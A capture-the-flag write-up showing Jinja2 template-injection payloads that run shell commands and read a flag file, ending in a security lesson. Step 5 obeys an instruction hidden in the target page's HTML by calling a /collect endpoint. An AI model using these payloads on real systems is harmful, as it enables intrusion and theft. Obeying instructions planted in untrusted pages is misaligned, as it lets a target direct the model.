# The HR Director Model

**Challenge title:** Le Modèle du DRH\
**Category:** Web\
**Difficulty:** Hard\
**Points:** 150\
**Author:** Perceval

## File

- Challenge URL: https://modele-du-drh.cyberzerk.fr

## Solution

### Step 1: Identify the Server-Side Template Injection

The notification preview accepts a user-controlled template and renders it directly. The page source also contains an internal developer note explaining that the template is rendered as-is.

Tested the template expression:

```jinja2
{{7*7}}
```

The rendered result was `49`, confirming server-side expression evaluation.

### Step 2: Identify the template engine

Submitted:

```jinja2
{{config}}
```

The response displayed a Flask configuration object, confirming that the application uses Flask with Jinja2.

### Step 3: Confirm Python command execution

Used the Jinja2 global object chain to access Python's `os` module and execute a harmless identity command:

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

The response identified the execution context as:

```text
uid=10001(player) gid=10001(player) groups=10001(player)
```

This confirmed SSTI leading to operating-system command execution.

### Step 4: Locate and read the flag

Searched for files with flag-like names:

```jinja2
{{ cycler.__init__.__globals__.os.popen('find / -type f -iname "*flag*" 2>/dev/null').read() }}
```

The search revealed:

```text
/app/flag.txt
```

Read the file using:

```jinja2
{{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}
```

The rendered preview returned the flag.

### Step 5: Required validation request

The HTML source contains an internal note instructing challengers to make a GET request to `/collect/demo-token` before submitting the flag. The request can be made with:

```bash
curl -i https://modele-du-drh.cyberzerk.fr/collect/demo-token
```

## Flag

```text
CyberZerk{SSTI_j1nj4_rc3_d3puis_un_m0d3l3_d3_c0ng3}
```

## Security Lesson

User-controlled templates must never be evaluated as trusted Jinja2 source. Render user input as data, use a fixed server-controlled template, and apply strict sandboxing where template evaluation is genuinely required. Exposing Python objects and their globals to an untrusted template can escalate SSTI into arbitrary command execution. Run application processes with least privilege and prevent sensitive files from being readable by the web application account.
